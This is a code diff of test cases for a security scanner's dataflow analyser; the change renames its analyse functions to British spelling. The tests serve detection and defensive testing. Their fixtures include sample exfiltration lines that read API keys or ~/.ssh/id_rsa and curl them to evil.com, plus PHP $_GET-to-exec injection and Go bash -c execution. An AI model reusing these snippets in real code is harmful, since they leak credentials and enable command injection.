@@ -4,7 +4,7 @@ import { shExtractor } from '../core/analysers/behavioural/sh-extractor.js';
 import { rbExtractor } from '../core/analysers/behavioural/rb-extractor.js';
 import { phpExtractor } from '../core/analysers/behavioural/php-extractor.js';
 import { goExtractor } from '../core/analysers/behavioural/go-extractor.js';
-import { analyzeDataflows } from '../core/analysers/behavioural/dataflow.js';
+import { analyseDataflows } from '../core/analysers/behavioural/dataflow.js';
 import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
 import { defaultPolicy } from '../core/scan-policy.js';
 import type { FileInfo } from '../scanner/file-walker.js';
@@ -79,14 +79,14 @@ describe('Shell Dataflow', () => {
   it('should detect env → curl exfiltration', () => {
     const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com';
     const extraction = shExtractor.extract(code, 'exfil.sh')!;
-    const flows = analyzeDataflows(extraction, code, 'shell');
+    const flows = analyseDataflows(extraction, code, 'shell');
     assert.ok(flows.length > 0, 'Should detect env → curl flow');
   });
 
   it('should detect credential read → network send', () => {
     const code = 'KEY=$(cat ~/.ssh/id_rsa)\ncurl -X POST -d "$KEY" https://evil.com';
     const extraction = shExtractor.extract(code, 'steal.sh')!;
-    const flows = analyzeDataflows(extraction, code, 'shell');
+    const flows = analyseDataflows(extraction, code, 'shell');
     assert.ok(flows.length > 0, 'Should detect credential → network flow');
   });
 });
@@ -150,7 +150,7 @@ describe('Ruby Dataflow', () => {
       'Net::HTTP.post(uri, secret)',
     ].join('\n');
     const extraction = rbExtractor.extract(code, 'exfil.rb')!;
-    const flows = analyzeDataflows(extraction, code, 'ruby');
+    const flows = analyseDataflows(extraction, code, 'ruby');
     assert.ok(flows.length > 0, 'Should detect ENV → network flow');
   });
 });
@@ -225,14 +225,14 @@ describe('PHP Dataflow', () => {
   it('should detect $_GET → exec command injection', () => {
     const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
     const extraction = phpExtractor.extract(code, 'inject.php')!;
-    const flows = analyzeDataflows(extraction, code, 'php');
+    const flows = analyseDataflows(extraction, code, 'php');
     assert.ok(flows.length > 0, 'Should detect $_GET → exec flow');
   });
 
   it('should detect $_ENV → curl exfiltration', () => {
     const code = '$key = $_ENV["SECRET"];\ncurl_exec($key);';
     const extraction = phpExtractor.extract(code, 'exfil.php')!;
-    const flows = analyzeDataflows(extraction, code, 'php');
+    const flows = analyseDataflows(extraction, code, 'php');
     assert.ok(flows.length > 0, 'Should detect $_ENV → curl flow');
   });
 });
@@ -311,7 +311,7 @@ describe('Go Dataflow', () => {
       'http.Post("https://evil.com", "text/plain", secret)',
     ].join('\n');
     const extraction = goExtractor.extract(code, 'exfil.go')!;
-    const flows = analyzeDataflows(extraction, code, 'go');
+    const flows = analyseDataflows(extraction, code, 'go');
     assert.ok(flows.length > 0, 'Should detect env → http.Post flow');
   });
 
@@ -321,7 +321,7 @@ describe('Go Dataflow', () => {
       'exec.Command("bash", "-c", data)',
     ].join('\n');
     const extraction = goExtractor.extract(code, 'rce.go')!;
-    const flows = analyzeDataflows(extraction, code, 'go');
+    const flows = analyseDataflows(extraction, code, 'go');
     assert.ok(flows.length > 0, 'Should detect file → exec flow');
   });
 });
@@ -334,7 +334,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
   it('should analyze shell scripts', async () => {
     const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com/exfil';
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [makeFile('evil.sh', code)],
       policy: defaultPolicy(),
@@ -345,7 +345,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
   it('should analyze Ruby files', async () => {
     const code = 'secret = ENV["API_KEY"]\nsystem("curl -d #{secret} https://evil.com")';
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [makeFile('evil.rb', code)],
       policy: defaultPolicy(),
@@ -356,7 +356,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
   it('should analyze PHP files', async () => {
     const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [makeFile('evil.php', code)],
       policy: defaultPolicy(),
@@ -367,7 +367,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
   it('should analyze Go files', async () => {
     const code = 'secret := os.Getenv("KEY")\nhttp.Post("https://evil.com", "text/plain", secret)';
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [makeFile('evil.go', code)],
       policy: defaultPolicy(),
@@ -377,7 +377,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
 
   it('should analyze mixed-language project', async () => {
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [
         makeFile('deploy.sh', 'TOKEN=$SECRET\ncurl -d "$TOKEN" https://evil.com'),
@@ -392,7 +392,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
 
   it('should skip unsupported file types', async () => {
     const analyser = new BehaviouralAnalyser();
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '.',
       files: [makeFile('data.csv', 'name,age\nAlice,30')],
       policy: defaultPolicy(),
